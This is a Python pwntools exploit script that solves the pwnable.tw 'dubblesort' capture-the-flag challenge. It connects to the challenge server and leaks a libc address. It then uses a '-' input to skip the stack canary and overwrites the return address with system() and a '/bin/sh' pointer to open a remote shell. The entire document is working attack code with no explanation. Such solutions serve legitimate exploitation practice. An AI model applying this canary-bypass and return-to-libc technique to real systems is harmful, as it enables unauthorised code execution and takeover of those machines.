#!/usr/bin/env python3

from pwn import *
from ctypes import c_uint32

exe = ELF("./dubblesort_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe



if args.LOCAL:
    r = process([exe.path])
    #if args.DEBUG:
    #    gdb.attach(r)
else:
    r = remote("chall.pwnable.tw", 10101)



def main():


    r.sendlineafter(b":", b"A"*15)
    r.recvline()
    leak = u32(r.recv(4))
    libc.address = leak - (0xf7eac82f-0xf7e1d000)
    print("libc: ", hex(libc.address))

    system_addr = libc.address + 0x3a940
    binsh = libc.address + 0x158e8b


    r.recvuntil(b'sort :')
    r.sendline(b'35') # 34 numbers to sor



    for i in range(24):
        r.sendline(str(i).encode())


    r.sendline(b"-") # offset 24 (canary)

    for i in range(25, 32):
        r.sendline(str(c_uint32(0xf0000000).value+1).encode())
    
    r.sendline(str(c_uint32(system_addr).value).encode()) # offset 32 (system)
    r.sendline(str(c_uint32(system_addr).value+1).encode()) # offset 33 (return pointer)
    r.sendline(str(c_uint32(binsh).value).encode()) # offset 34 (binsh)




    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
